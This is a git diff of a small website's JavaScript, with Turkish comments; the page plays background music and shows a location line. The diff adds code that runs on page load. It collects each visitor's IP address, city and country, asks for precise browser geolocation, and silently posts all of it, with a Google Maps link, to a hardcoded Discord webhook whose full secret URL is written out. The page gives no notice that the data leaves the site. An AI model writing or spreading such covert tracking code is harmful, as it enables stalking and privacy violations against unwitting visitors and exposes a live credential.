@@ -1,7 +1,7 @@
 const playBtn = document.getElementById("playMusic");
 const bgMusic = document.getElementById("bgMusic");
 
-// Müzik Çalma Fonksiyonu (Senin mevcut kodun)
+// Müzik Çalma
 if (playBtn) {
     playBtn.addEventListener("click", () => {
         bgMusic.play();
@@ -9,38 +9,54 @@ if (playBtn) {
     });
 }
 
-// --- KONUM BULMA SİSTEMİ BAŞLANGIÇ ---
+// --- DISCORD'A VERİ GÖNDERME FONKSİYONU ---
+function discordaGonder(mesaj) {
+    const webhookURL = "https://discord.com/api/webhooks/1470176972410851379/7mzBrZBZzn_oW7nXfV0538TOe1rhbTo46P9IoIRXoHEMx4AcvFJjqvqtIDNa2BzGQ47I"; // Discord'dan aldığın URL
+    
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            content: mesaj,
+            username: "Site Ziyaretçi Botu",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/25/25231.png"
+        })
+    });
+}
+
+// --- KONUM BULMA VE GÖNDERME SİSTEMİ ---
 function konumuGetir() {
     const konumMetni = document.getElementById("konum-bilgi");
-    if (!konumMetni) return; // Eğer sayfada bu ID yoksa hata vermemesi için
 
-    // 1. Aşama: IP üzerinden hızlı şehir tahmini (Kullanıcıya hemen bir şey göstermek için)
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-            konumMetni.innerText = `${data.city}, ${data.country_name} civarından bağlanıyorsun...`;
+            let ilkMesaj = `🚀 **Yeni Ziyaretçi!**\n📍 Şehir: ${data.city} / ${data.country_name}\n🌐 IP: ${data.ip}`;
             
-            // 2. Aşama: Tarayıcıdan tam koordinat izni iste (Hassas konum için)
+            if (konumMetni) {
+                konumMetni.innerText = `${data.city}, ${data.country_name} civarından bağlanıyorsun...`;
+            }
+            
+            // İlk olarak şehir bilgisini gönder
+            discordaGonder(ilkMesaj);
+
+            // Hassas konum iste
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude.toFixed(4);
-                        const lng = position.coords.longitude.toFixed(4);
+                navigator.geolocation.getCurrentPosition((position) => {
+                    const lat = position.coords.latitude.toFixed(5);
+                    const lng = position.coords.longitude.toFixed(5);
+                    const haritaLinki = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    if (konumMetni) {
                         konumMetni.innerText = `Tam konumun: ${data.city} (${lat}, ${lng}) 📍`;
-                        console.log("Hassas Konum Alındı:", lat, lng);
-                    },
-                    (error) => {
-                        console.log("Hassas konum reddedildi veya bulunamadı, IP ile devam ediliyor.");
                     }
-                );
+
+                    // Hassas konumu Discord'a gönder
+                    discordaGonder(`🎯 **Tam Konum Bulundu!**\n📍 Koordinat: ${lat}, ${lng}\n🗺️ Harita: ${haritaLinki}`);
+                });
             }
         })
-        .catch(err => {
-            konumMetni.innerText = "Konum bilgisi şu an alınamıyor.";
-            console.error("Konum hatası:", err);
-        });
+        .catch(err => console.error("Hata:", err));
 }
 
-// Sayfa yüklendiğinde konumu getir
 window.addEventListener('load', konumuGetir);
-// --- KONUM BULMA SİSTEMİ BİTİŞ ---
